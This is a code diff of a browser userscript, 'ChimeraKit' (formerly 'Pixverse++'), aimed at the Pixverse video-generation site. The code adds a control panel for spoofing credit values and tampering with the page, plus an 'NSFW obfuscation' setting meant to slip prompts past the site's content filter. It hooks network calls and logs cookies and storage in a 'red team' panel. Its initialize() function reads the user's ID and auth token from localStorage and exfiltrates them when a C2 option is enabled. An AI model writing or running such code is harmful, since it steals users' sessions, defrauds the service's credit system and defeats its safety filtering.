+    creditSpoofValueInput.addEventListener('input', async () => {
+      config.creditSpoofValue = parseInt(creditSpoofValueInput.value, 10) || 0;
+      await GM_setValue('creditSpoofValue', config.creditSpoofValue);
+      showToast(`Spoof value set to: ${config.creditSpoofValue}`);
+      setupDOMTampering(); // Re-evaluate DOM tampering if active
+    });
+    domTamperTargetInput.addEventListener('input', async () => {
+        config.domTamperTarget = domTamperTargetInput.value.trim();
+        await GM_setValue('domTamperTarget', config.domTamperTarget);
+        showToast(`DOM tamper target set to: ${config.domTamperTarget}`);
+        setupDOMTampering(); // Re-evaluate DOM tampering with new target
+    });
+
+
+    forceQualitySelect.addEventListener('change', async () => { config.forceQuality = forceQualitySelect.value; await GM_setValue('forceQuality', config.forceQuality); showToast(`Forced quality set to: ${config.forceQuality}`); });
+    nsfwObfuscationSelect.addEventListener('change', async () => { config.nsfwObfuscation = nsfwObfuscationSelect.value; await GM_setValue('nsfwObfuscation', config.nsfwObfuscation); showToast(`NSFW obfuscation set to: ${config.nsfwObfuscation}`); });
+
+    toggleBtn.addEventListener('click', () => {
+      const isHidden = content.style.display === 'none';
+      content.style.display = isHidden ? 'block' : 'none';
+      toggleBtn.textContent = isHidden ? '-' : '+';
+    });
+
+    // Add drag functionality to the control panel
+    let isDragging = false;
+    let offsetX, offsetY;
+
+    const storedPosX = await GM_getValue('panelPosX', 'auto');
+    const storedPosY = await GM_getValue('panelPosY', '10px');
+
+    panel.style.left = storedPosX;
+    panel.style.top = storedPosY;
+    panel.style.right = storedPosX === 'auto' ? '10px' : 'auto';
+
+    header.addEventListener('mousedown', (e) => {
+      isDragging = true;
+      offsetX = e.clientX - panel.getBoundingClientRect().left;
+      offsetY = e.clientY - panel.getBoundingClientRect().top;
+      panel.style.cursor = 'grabbing';
+      panel.style.right = 'auto'; // Disable right/bottom positioning when dragging
+      e.preventDefault();
+    });
+
+    document.addEventListener('mousemove', (e) => {
+      if (!isDragging) return;
+      panel.style.left = `${e.clientX - offsetX}px`;
+      panel.style.top = `${e.clientY - offsetY}px`;
+    });
+
+    document.addEventListener('mouseup', () => {
+      isDragging = false;
+      panel.style.cursor = 'grab';
+      GM_setValue('panelPosX', panel.style.left);
+      GM_setValue('panelPosY', panel.style.top);
+    });
+    log('Control Panel injected and configured.');
+  }
+
+  /**
+   * Injects CSS styles for the toast notification and the control panel.
+   */
+  function injectCoreStyles() {
+    if (document.getElementById("pk-core-styles")) return;
+    const style = document.createElement("style");
+    style.id = "pk-core-styles";
+    style.textContent = `
+      /* --- Toast Styles (Cyan Theme) --- */
+      .pv-toast {
+        position: fixed; bottom: 22px; left: 50%; transform: translateX(-50%);
+        background: rgba(20,40,48,0.94); color: #15FFFF; padding: 8px 20px;
+        border-radius: 6px; font: 15px/1.2 sans-serif; z-index: 299999;
+        opacity: 0; transition: opacity .25s ease-in-out; pointer-events: none;
+        box-sizing: border-box; user-select: none;
+      }
+      .pv-toast-visible { opacity: 1; }
+
+      /* --- Control Panel Styles (Dark Theme with Cyan Accents) --- */
+      #pv-control-panel {
+        position: fixed; top: 10px; right: 10px; z-index: 300000;
+        background: #1a1a1a; color: #e0e0e0; border: 1px solid #444;
+        border-radius: 6px; font-family: sans-serif; font-size: 13px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.5); user-select: none;
+        min-width: 320px; cursor: grab;
+      }
+      .pv-panel-header {
+        display: flex; justify-content: space-between; align-items: center;
+        padding: 6px 10px; background: #2a2a2a; border-bottom: 1px solid #444;
+        cursor: inherit;
+      }
+      .pv-panel-header span { font-weight: bold; color: #15FFFF; }
+      #pv-panel-toggle {
+        background: #444; color: #e0e0e0; border: none; border-radius: 4px;
+        width: 20px; height: 20px; line-height: 20px; text-align: center;
+        cursor: pointer; font-weight: bold;
+      }
+      .pv-panel-content { padding: 10px; }
+      .pv-panel-row {
+        display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;
+      }
+      .pv-panel-row:last-child { margin-bottom: 0; }
+      .pv-panel-row label { margin-right: 15px; cursor: help; }
+      .pv-panel-row input[type="text"], .pv-panel-row input[type="number"], .pv-panel-row select {
+        background: #111; color: #e0e0e0; border: 1px solid #555;
+        border-radius: 4px; padding: 4px 6px; width: 170px; font-size: 12px;
+        flex-grow: 1;
+      }
+      .pv-panel-row input[type="checkbox"] { width: 16px; height: 16px; margin-left: auto; }
+      .pv-separator { border: 0; border-top: 1px solid #333; margin: 10px 0; }
+    `;
+    document.head.appendChild(style);
+  }
+
+  // Inject CSS for the dedicated debug panel (Cyan/Green Theme)
+  function injectDebugCSS() {
+    const styleId = "pv-debug-css";
+    if (document.getElementById(styleId)) return;
+
+    const styleElement = document.createElement("style");
+    styleElement.id = styleId;
+    styleElement.textContent = `
+      #pv-debug-panel {
+        position: fixed;
+        bottom: 10px; /* Positioned at bottom to not conflict with control panel */
+        right: 10px;
+        width: 380px;
+        height: auto;
+        max-height: 50vh; /* Reduced max height for better screen usage */
+        background: rgba(30, 30, 30, 0.95);
+        color: #15FFFF; /* Primary text color (cyan) */
+        border: 1px solid #15FFFF;
+        border-radius: 8px;
+        font-family: 'Consolas', 'Monaco', monospace;
+        font-size: 11px;
+        z-index: 999998; /* Below control panel */
+        box-shadow: 0 4px 8px rgba(0,0,0,0.5);
+        overflow: hidden;
+        display: flex;
+        flex-direction: column;
+      }
+      #pv-debug-panel.collapsed {
+        height: auto;
+        max-height: 35px;
+      }
+      #pv-debug-panel .header {
+        background: rgba(0, 0, 0, 0.8);
+        padding: 5px 10px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        cursor: grab;
+      }
+      #pv-debug-panel .header span {
+        font-weight: bold;
+        color: #15FFFF;
+      }
+      #pv-debug-panel button {
+        background: #008080; /* Dark teal button */
+        color: #15FFFF;
+        border: 1px solid #15FFFF;
+        padding: 3px 8px;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 10px;
+        margin-left: 5px;
+      }
+      #pv-debug-panel button:hover {
+        background: #00a0a0; /* Lighter teal on hover */
+      }
+      #pv-debug-panel .body {
+        flex-grow: 1;
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+      }
+      #pv-debug-panel.collapsed .body {
+        display: none;
+      }
+      #pv-debug-panel .controls {
+        padding: 5px 10px;
+        display: flex;
+        flex-wrap: wrap;
+        gap: 5px;
+        border-bottom: 1px dashed #004040;
+      }
+      #pv-debug-panel .section-area {
+        flex: 1;
+        min-height: 100px;
+        padding: 5px 10px;
+        overflow-y: auto;
+        border-bottom: 1px dashed #004040;
+        display: flex;
+        flex-direction: column;
+      }
+      #pv-debug-panel .section-area:last-of-type {
+        border-bottom: none;
+      }
+      #pv-debug-panel .section-area h4 {
+        margin: 5px 0;
+        color: #15FFFF;
+        font-size: 12px;
+        flex-shrink: 0;
+      }
+      #pv-debug-panel .log-output {
+        flex-grow: 1;
+        background: rgba(0,0,0,0.6);
+        border: 1px solid #002020;
+        padding: 5px;
+        overflow-y: auto;
+        white-space: pre-wrap;
+        word-break: break-all;
+        height: 100%;
+      }
+      #pv-debug-panel .log-output div {
+        margin-bottom: 2px;
+        line-height: 1.2;
+      }
+      #pv-debug-panel .log-output div:last-child {
+        margin-bottom: 0;
+      }
+      #pv-instructions-content {
+          color: #E0FFFF;
+          font-size: 11px;
+      }
+      #pv-instructions-content ul {
+          margin-left: 15px;
+          padding-left: 0;
+      }
+      #pv-instructions-content li {
+          margin-bottom: 5px;
+      }
+      #pv-instructions-content strong {
+          color: #FFD700;
+      }
+    `;
+    document.head.appendChild(styleElement);
+    log('Debug CSS injected.');
+  }
+
+  /**
+   * Injects the Debug UI into the DOM. Only called if debugMode is true.
+   */
+  let debugUIInjected = false;
+  function injectDebugUI() {
+    if (!config.debugMode || debugUIInjected || !document.body) return;
+
+    try {
+        injectDebugCSS(); // Ensure debug CSS is present
+
+        const panel = document.createElement("div");
+        panel.id = "pv-debug-panel";
+        panel.innerHTML = `
+          <div class="header">
+            <span>ChimeraKit Debug</span>
+            <button id="pv-toggle-debug-btn">Toggle</button>
+          </div>
+          <div class="body">
+            <div class="controls">
+              <button id="pv-clear-logs">Clear All</button>
+              <button id="pv-dump-state">Dump State</button>
+              <button id="pv-analyze-credits">Analyze Credits</button>
+              <button id="pv-show-instructions">Instructions</button>
+            </div>
+
+            <div id="pv-instructions-area" class="section-area" style="display: none;">
+                <h4>Instructions</h4>
+                <div id="pv-instructions-content" class="log-output">
+                  <p><strong>Goal:</strong> Capture the full sequence of network requests and browser state during targeted operations.</p>
+                  <ul>
+                    <li><strong>1. Ensure Debug Mode:</strong> Enable 'Debug Mode' in the ChimeraKit control panel (top right). This UI will appear.</li>
+                    <li><strong>2. Clear Logs:</strong> Click "Clear All" to start with a fresh log.</li>
+                    <li><strong>3. Dump Initial State:</strong> Click "Dump State" to save a snapshot of browser storage/cookies.</li>
+                    <li><strong>4. Perform Actions:</strong> Execute the specific Pixverse actions you wish to debug (e.g., credit bypass sequence, NSFW prompt).</li>
+                    <li><strong>5. Dump Final State:</strong> After actions, click "Dump State" again.</li>
+                    <li><strong>6. Analyze (Optional):</strong> Click "Analyze Credits" for automated suggestions.</li>
+                    <li><strong>7. Extract Data:</strong> The "API/Structured Data" section (<code style="color:#FFD700;">window.redTeamGoods</code> via console) contains all captured data. Copy this data.</li>
+                    <li><strong>8. Toggle UI:</strong> Use the "Toggle" button in the header to collapse/expand.</li>
+                  </ul>
+                  <p><strong>Important:</strong> This tool is for diagnostic use only. For full exploitation, ensure a suitable CSP bypass is active.</p>
+                </div>
+            </div>
+
+            <div class="log-area section-area">
+              <h4>Raw Debug Log (<span id="pv-debug-log-count">0</span>)</h4>
+              <div id="pv-debug-log-output" class="log-output"></div>
+            </div>
+            <div class="goods-area section-area">
+              <h4>API/Structured Data (<span id="pv-goods-count">0</span>)</h4>
+              <div id="pv-goods-output" class="log-output"></div>
+            </div>
+          </div>
+        `;
+        document.body.appendChild(panel);
+
+        // Event Listeners for UI
+        document.getElementById('pv-clear-logs').addEventListener('click', window.redTeamClear);
+        document.getElementById('pv-dump-state').addEventListener('click', () => dumpBrowserState("Manual Trigger"));
+        document.getElementById('pv-analyze-credits').addEventListener('click', window.analyzeCredits);
+
+        const toggleInstructionsBtn = document.getElementById('pv-show-instructions');
+        const instructionsArea = document.getElementById('pv-instructions-area');
+        toggleInstructionsBtn.addEventListener('click', () => {
+          const isInstructionsVisible = instructionsArea.style.display === 'flex';
+          instructionsArea.style.display = isInstructionsVisible ? 'none' : 'flex';
+          document.querySelectorAll('#pv-debug-panel .section-area:not(#pv-instructions-area)').forEach(el => {
+            el.style.display = isInstructionsVisible ? 'flex' : 'none';
+          });
+        });
+
+        const toggleDebugBtn = document.getElementById('pv-toggle-debug-btn');
+        toggleDebugBtn.addEventListener('click', () => {
+          panel.classList.toggle('collapsed');
+          toggleDebugBtn.textContent = panel.classList.contains('collapsed') ? 'Expand' : 'Collapse';
+        });
+
+        // Make panel draggable
+        let isDragging = false;
+        let offsetX, offsetY;
+        const header = panel.querySelector('.header');
+
+        header.addEventListener('mousedown', (e) => {
+          isDragging = true;
+          offsetX = e.clientX - panel.getBoundingClientRect().left;
+          offsetY = e.clientY - panel.getBoundingClientRect().top;
+          panel.style.cursor = 'grabbing';
+          e.preventDefault();
+        });
+
+        document.addEventListener('mousemove', (e) => {
+          if (!isDragging) return;
+          panel.style.left = `${e.clientX - offsetX}px`;
+          panel.style.top = `${e.clientY - offsetY}px`;
+        });
+
+        document.addEventListener('mouseup', () => { isDragging = false; panel.style.cursor = 'grab'; });
+
+        updateDebugUI();
+        debugUIInjected = true;
+        log('Debug UI injected and listeners attached.');
+    } catch (e) {
+        error('Error injecting debug UI:', e);
+    }
+  }
+
+  // Update the debug UI with current log data
+  const updateDebugUI = throttle(() => {
+    if (!config.debugMode || !debugUIInjected) return;
+
+    const debugLogOutput = document.getElementById('pv-debug-log-output');
+    const goodsOutput = document.getElementById('pv-goods-output');
+    const debugLogCount = document.getElementById('pv-debug-log-count');
+    const goodsCount = document.getElementById('pv-goods-count');
+
+    if (!debugLogOutput || !goodsOutput) return;
+
+    const newDebugLogHTML = _redTeamDebugLog.map(entry => `<div>${entry}</div>`).join('');
+    if (debugLogOutput.innerHTML !== newDebugLogHTML) {
+      debugLogOutput.innerHTML = newDebugLogHTML;
+      debugLogOutput.scrollTop = debugLogOutput.scrollHeight;
+      debugLogCount.textContent = _redTeamDebugLog.length;
+    }
+
+    const newGoodsHTML = _redTeamGoods.map(entry => {
+      const displayData = JSON.stringify(entry, null, 2);
+      return `<div><pre>${displayData.length > 1000 ? displayData.substring(0, 1000) + '... (truncated for UI display)' : displayData}</pre></div>`;
+    }).join('');
+    if (goodsOutput.innerHTML !== newGoodsHTML) {
+      goodsOutput.innerHTML = newGoodsHTML;
+      goodsOutput.scrollTop = goodsOutput.scrollHeight;
+      goodsCount.textContent = _redTeamGoods.length;
+    }
+  }, 200, 50);
+
+  //────── INITIALIZATION & LIFECYCLE ──────//
 
   /**
    * Initializes the toolkit by applying all necessary overrides and setting up features.
    * Ensures that initialization happens only once.
    */
-  function initialize() {
-    if (isInitialized) {
-      return; // Prevent re-initialization.
-    }
+  async function initialize() {
+    if (isInitialized) return;
+    log('Attempting to initialize ChimeraKit...');
     try {
-      overrideContextMenuBlockers();
-      overrideXHR();
-      overrideFetch();
-      setupWatermarkButton();
-      setupSelfHealingHooks(); // <<< NEW: Enable self-healing for network hooks
+      await loadConfig(); // Load configuration from GM_setValue first
 
-      // Example: Read from local storage and exfiltrate data on initialization
-      try {
-        const userId = localStorage.getItem('pixverse_user_id'); // Placeholder key, adapt as needed
-        if (userId) {
-          log('Found potential user ID in local storage:', userId);
-          exfiltrateData("local_storage_user_id", userId);
-        }
-        const token = localStorage.getItem('pixverse_auth_token'); // Placeholder key, adapt as needed
-        if (token) {
-          log('Found potential auth token in local storage:', token);
-          exfiltrateData("local_storage_auth_token", token);
-        }
-      } catch (e) {
-        error("Error accessing local storage during initialization:", e);
+      injectCoreStyles(); // Inject CSS for control panel and toast
+      await createControlPanel(); // Create and render the control panel
+
+      overrideContextMenuBlockers(); // Enable native downloads
+      overrideXHR(); // Hook XHR
+      overrideFetch(); // Hook Fetch
+      setupSelfHealingHooks(); // Ensure hooks persist
+
+      // Initial state of DOM tampering
+      setupDOMTampering();
+
+      // Auto-exfiltrate data on initialization if configured
+      if (config.c2Enabled && config.autoExfilAuth) {
+          try {
+              const userId = localStorage.getItem('pixverse_user_id');
+              if (userId) { log('Found local user ID for exfil:', userId); exfiltrateData("local_storage_user_id", userId); }
+              const token = localStorage.getItem('pixverse_auth_token');
+              if (token) { log('Found local auth token for exfil:', token); exfiltrateData("local_storage_auth_token", token); }
+          } catch (e) { error("Error accessing local storage for auto-exfil:", e); }
       }
 
+      dumpBrowserState("On Initialize"); // Log initial browser state
+      updateDebugUIVisibility(); // Show debug UI if debugMode is on
+
       isInitialized = true;
-      log('Pixverse++ initialized'); // Will only log in DEBUG_MODE
-      showToast('Pixverse++ Toolkit loaded ✓'); // Will only show in DEBUG_MODE
+      log(`ChimeraKit v${GM_info.script.version} initialized successfully!`);
+      showToast(`ChimeraKit v${GM_info.script.version} loaded ✓`);
     } catch (e) {
-      error('Initialization failed', e); // Will only log in DEBUG_MODE
-      showToast('Pixverse++ init error'); // Will only show in DEBUG_MODE
+      error('ChimeraKit initialization failed catastrophically! Error:', e);
+      showToast('ChimeraKit init error!');
     }
   }
 
   // Determine when to initialize the script.
-  // @run-at document-start ensures the script runs as early as possible.
-  // If the document is still loading, wait for DOMContentLoaded to ensure basic DOM is ready.
-  // Otherwise, if the document is already interactive/complete, initialize immediately.
   if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', initialize, { once: true });
   } else {
     initialize();
   }
-
-  // Immediately-invoked function to inject minimal CSS for the toast notification.
-  // This ensures the CSS is present as soon as possible, BUT ONLY IF DEBUG_MODE is true.
-  (function() {
-    if (!DEBUG_MODE) return; // <<< NEW: Do not inject toast CSS in stealth mode.
-    if (document.getElementById("pv-toast-css")) {
-      return; // Prevent re-injection of the CSS if already present.
-    }
-    const styleElement = document.createElement("style");
-    styleElement.id = "pv-toast-css";
-    styleElement.textContent = `.pv-toast{box-sizing:border-box;user-select:none;pointer-events:none;}`;
-    document.head.appendChild(styleElement);
-  })();
 
 })();
